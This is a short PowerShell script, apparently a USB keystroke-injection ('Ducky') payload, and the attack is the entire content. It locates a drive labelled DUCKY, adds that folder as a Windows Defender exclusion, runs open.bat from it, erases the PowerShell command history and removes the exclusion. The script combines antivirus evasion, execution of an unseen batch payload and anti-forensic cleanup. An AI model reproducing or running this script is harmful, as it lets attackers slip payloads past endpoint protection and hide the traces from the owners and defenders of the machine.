$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'DUCKY' } | select name
cd $usbPath.name
Add-MpPreference -ExclusionPath "$pwd"
./open.bat
Remove-Item (Get-PSreadlineOption).HistorySavePath
Remove-MpPreference -ExclusionPath "$pwd"